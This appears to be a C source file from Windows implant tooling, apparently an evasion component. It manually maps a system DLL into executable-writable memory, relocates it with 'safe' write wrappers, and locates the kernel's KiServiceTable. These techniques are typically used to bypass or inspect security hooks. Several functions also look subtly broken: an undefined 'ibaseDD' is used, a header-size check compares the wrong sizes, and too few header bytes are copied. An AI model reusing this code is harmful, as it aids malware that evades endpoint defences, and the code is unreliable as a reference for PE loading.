
#include "HM_Reloc.h"
#include "HM_SafeProcedures.h"
#include "common.h"

static BOOL readPEInfo(char *modulePos, IMAGE_DOS_HEADER *outMZ, IMAGE_NT_HEADERS32 *outPE, IMAGE_SECTION_HEADER**outSecHdr)
{
	IMAGE_DOS_HEADER *mzH;
	mzH = (IMAGE_DOS_HEADER*)modulePos;

	if(mzH->e_magic != 0x5a4d)
		return FALSE;

	IMAGE_NT_HEADERS32 *peH = (IMAGE_NT_HEADERS32 *)((UINT8*)modulePos + mzH->e_lfanew);

	if (peH->FileHeader.SizeOfOptionalHeader != sizeof(IMAGE_NT_HEADERS32))
		return FALSE;

	IMAGE_SECTION_HEADER *secHdr = IMAGE_FIRST_SECTION(peH);

	memcpy(outMZ, mzH, sizeof(IMAGE_DOS_HEADER));
	memcpy(outPE, peH, sizeof(IMAGE_NT_HEADERS32));

	*outSecHdr = secHdr;

	return TRUE;
}


//*******************************************************************************************************
// Returns the total size required to load a PE image into memory
//
//*******************************************************************************************************

int calcTotalImageSize(IMAGE_DOS_HEADER *inMZ, IMAGE_NT_HEADERS32 *inPE, IMAGE_SECTION_HEADER *inSecHdr)
{
	int result = 0;
	int alignment = inPE->OptionalHeader.SectionAlignment;

	if(inPE->OptionalHeader.SizeOfHeaders % alignment == 0)
		result += inPE->OptionalHeader.SizeOfHeaders;
	else
	{
		int val = inPE->OptionalHeader.SizeOfHeaders / alignment;
		val++;
		result += (val * alignment);
	}
	for(int i = 0; i < inPE->FileHeader.NumberOfSections; i++)
	{
		if(inSecHdr[i].Misc.VirtualSize)
		{
			if(inSecHdr[i].Misc.VirtualSize % alignment == 0)
				result += inSecHdr[i].Misc.VirtualSize;
			else
			{
				int val = inSecHdr[i].Misc.VirtualSize / alignment;
				val++;
				result += (val * alignment);
			}
		}
	}

	return result;
}


//*******************************************************************************************************
// Returns the aligned size of a section
//
//*******************************************************************************************************

ULONG getAlignedSize(unsigned long curSize, unsigned long alignment)
{	
	if(curSize % alignment == 0)
		return curSize;
	else
	{
		int val = curSize / alignment;
		val++;
		return (val * alignment);
	}
}

//*******************************************************************************************************
// Copy a PE image from exePtr to ptrLoc with proper memory alignment of all sections
//
//*******************************************************************************************************

BOOL loadPE(char *exePtr, IMAGE_DOS_HEADER *inMZ, IMAGE_NT_HEADERS32 *inPE,
			IMAGE_SECTION_HEADER *inSecHdr, LPVOID ptrLoc)
{
	char *outPtr = (char *)ptrLoc;

	memcpy(outPtr, exePtr, inPE->FileHeader.SizeOfOptionalHeader);
	outPtr += getAlignedSize(inPE->OptionalHeader.SizeOfHeaders, inPE->OptionalHeader.SectionAlignment);

	for(int i = 0; i < inPE->FileHeader.NumberOfSections; i++)
	{
		if(inSecHdr[i].SizeOfRawData > 0)
		{
			unsigned long toRead = inSecHdr[i].SizeOfRawData;
			if(toRead > inSecHdr[i].Misc.VirtualSize)
				toRead = inSecHdr[i].Misc.VirtualSize;

			memcpy(outPtr, exePtr + inSecHdr[i].PointerToRawData, toRead);

			outPtr += getAlignedSize(inSecHdr[i].Misc.VirtualSize, inPE->OptionalHeader.SectionAlignment);
		}
	}

	return true;
}


//*******************************************************************************************************
// Loads the DLL into memory and align it
//
//*******************************************************************************************************

LPVOID loadDLL(char *dllName)
{
	char moduleFilename[MAX_PATH + 1];
	LPVOID ptrLoc = NULL;
	IMAGE_DOS_HEADER mzH2;
	IMAGE_NT_HEADERS32 peH2;
	IMAGE_SECTION_HEADER *secHdr2;

	FNC(GetSystemDirectoryA)(moduleFilename, MAX_PATH);
	if((myStrlenA(moduleFilename) + myStrlenA(dllName)) >= MAX_PATH)
		return NULL;

	strncat_s(moduleFilename, MAX_PATH, dllName, MAX_PATH);

	// load this EXE into memory because we need its original Import Hint Table

	HANDLE fp;
	fp = FNC(CreateFileA)(moduleFilename, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);

	if(fp != INVALID_HANDLE_VALUE)
	{
		BY_HANDLE_FILE_INFORMATION fileInfo;
		FNC(GetFileInformationByHandle)(fp, &fileInfo);

		DWORD fileSize = fileInfo.nFileSizeLow;
		if(fileSize)
		{
			LPVOID exePtr = HM_SafeVirtualAllocEx(FNC(GetCurrentProcess)(), NULL, fileSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
			if(exePtr)
			{
				DWORD read;

				if(FNC(ReadFile)(fp, exePtr, fileSize, &read, NULL) && read == fileSize)
				{					
					if(readPEInfo((char *)exePtr, &mzH2, &peH2, &secHdr2))
					{
						int imageSize = calcTotalImageSize(&mzH2, &peH2, secHdr2);						

						ptrLoc = HM_SafeVirtualAllocEx(FNC(GetCurrentProcess)(), NULL, imageSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
						//ptrLoc = HeapAlloc(GetProcessHeap(), 0, imageSize);
						if(ptrLoc)
						{							
							loadPE((char *)exePtr, &mzH2, &peH2, secHdr2, ptrLoc);
						}
					}

				}
				//HeapFree(GetProcessHeap(), 0, exePtr);
				FNC(VirtualFreeEx)(FNC(GetCurrentProcess)(), exePtr, 0, MEM_RELEASE);
			}
		}
		CloseHandle(fp);
	}

	return ptrLoc;
}

DWORD myStrlenA(char *ptr)
{
	DWORD len = 0;
	while(*ptr)
	{
		len++;
		ptr++;
	}

	return len;
}

DWORD GetHeaders(PCHAR ibase,
                 PIMAGE_FILE_HEADER *pFH,
                 PIMAGE_OPTIONAL_HEADER *pOH,
                 PIMAGE_SECTION_HEADER *pSH)

{
    PIMAGE_DOS_HEADER mzhead = (PIMAGE_DOS_HEADER) ibase;
    
    if( (mzhead->e_magic != IMAGE_DOS_SIGNATURE) ||        
        (ibaseDD[mzhead->e_lfanew] != IMAGE_NT_SIGNATURE)  )
        return false;
    
    *pFH = (PIMAGE_FILE_HEADER)&ibase[mzhead->e_lfanew];
    if( ((PIMAGE_NT_HEADERS)*pFH)->Signature != IMAGE_NT_SIGNATURE )
        return false;

    *pFH = (PIMAGE_FILE_HEADER)((PBYTE)*pFH + sizeof(IMAGE_NT_SIGNATURE));
    
    *pOH = (PIMAGE_OPTIONAL_HEADER)((PBYTE)*pFH + sizeof(IMAGE_FILE_HEADER));

    if ((*pOH)->Magic!=IMAGE_NT_OPTIONAL_HDR32_MAGIC)
        return false;
    
    *pSH = (PIMAGE_SECTION_HEADER)((PBYTE)*pOH + sizeof(IMAGE_OPTIONAL_HEADER));

    return true;
}


DWORD FindKiServiceTable(HMODULE hModule,DWORD dwKSDT)
{
    PIMAGE_FILE_HEADER		pFH;
    PIMAGE_OPTIONAL_HEADER	pOH;
    PIMAGE_SECTION_HEADER   pSH;
    PIMAGE_BASE_RELOCATION  pBR;
    PIMAGE_FIXUP_ENTRY		pFE;    
    
    DWORD	dwFixups=0,i;
	DWORD	dwPointerRva;
	DWORD	dwPointsToRva;
	DWORD	dwKiServiceTable;
    BOOL    bFirstChunk;

    if( !GetHeaders((PCHAR)hModule,&pFH,&pOH,&pSH) )
		return NULL;

    if( (pOH->DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress) &&
		!((pFH->Characteristics)&IMAGE_FILE_RELOCS_STRIPPED) ) {
        
        pBR = (PIMAGE_BASE_RELOCATION) RVATOVA(pOH->DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress,hModule);

        bFirstChunk = true;

        while( bFirstChunk || pBR->VirtualAddress ) {
            
			bFirstChunk = false;
            pFE = (PIMAGE_FIXUP_ENTRY)((DWORD)pBR + sizeof(IMAGE_BASE_RELOCATION));

            for( i=0; i < (pBR->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION))>>1; i++,pFE++ ) {
                if( pFE->type == IMAGE_REL_BASED_HIGHLOW ) {
                    dwFixups++;
                    dwPointerRva  = pBR->VirtualAddress + pFE->offset;
                    dwPointsToRva = *(PDWORD)((DWORD)hModule + dwPointerRva) - (DWORD)pOH->ImageBase;

                    if( dwPointsToRva == dwKSDT ) {
                        if( *(PWORD)((DWORD)hModule + dwPointerRva - 2) == 0x05c7 ) {
                            dwKiServiceTable = *(PDWORD)((DWORD)hModule + dwPointerRva + 4) - pOH->ImageBase;
                            return dwKiServiceTable;
                        }
                    }          
                } 
            }
	        *(PDWORD)&pBR += pBR->SizeOfBlock;
        }
    }    
    
    return NULL;
}

BOOL RelocImage(PVOID exeAddr, PVOID newAddr)
{
	IMAGE_DOS_HEADER mzH2;
	IMAGE_NT_HEADERS32 peH2;
	IMAGE_SECTION_HEADER *secHdr2;

	if (!exeAddr || !newAddr)
		return FALSE;

	if(!readPEInfo((char *)exeAddr, &mzH2, &peH2, &secHdr2))
		return FALSE;

	if(peH2.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress && peH2.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size) {
		FixupBlock *fixBlk = (FixupBlock *)((char *)exeAddr + peH2.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);

		while(fixBlk->blockSize) {
			// Que - Questa funzione imposta _flags_ alle caratteristiche della sezione, in modo da
			// rilocare soltanto le entry di quelle sezioni che sono eseguibili. La mettiamo qui
			// cosi' evitiamo overhead, tanto ogni blocco si trova sicuramente all'interno della
			// stessa sezione.
			DWORD flags = 0;

			for(int j = 0; j < peH2.FileHeader.NumberOfSections; j++){
				if(peH2.OptionalHeader.ImageBase + fixBlk->pageRVA >= peH2.OptionalHeader.ImageBase + secHdr2[j].VirtualAddress&&
					peH2.OptionalHeader.ImageBase + fixBlk->pageRVA < peH2.OptionalHeader.ImageBase + secHdr2[j].VirtualAddress +
					secHdr2[j].Misc.VirtualSize){

						flags = secHdr2[j].Characteristics;
						break;
				}
				flags = 0;
			}

			int numEntries = (fixBlk->blockSize - sizeof(FixupBlock)) >> 1;
			unsigned short *offsetPtr = (unsigned short *)(fixBlk + 1);
			for(int i = 0; i < numEntries; i++)	{				
				int relocType = (*offsetPtr & 0xF000) >> 12;
				if(relocType == 3) {
					DWORD *codeLoc = (DWORD *)((char *)exeAddr + fixBlk->pageRVA + (*offsetPtr & 0x0FFF));					
					DWORD delta = (DWORD)newAddr - (DWORD)peH2.OptionalHeader.ImageBase;
					DWORD value = (*codeLoc) + delta;
					DWORD dummy;

					if(flags && (flags & IMAGE_SCN_MEM_EXECUTE))
						HM_SafeWriteProcessMemory(FNC(GetCurrentProcess)(), codeLoc, &value, sizeof(DWORD), &dummy);
				}
				offsetPtr++;
			}
			fixBlk = (FixupBlock *)offsetPtr;
		}
		return TRUE;
	}
	return FALSE;
}
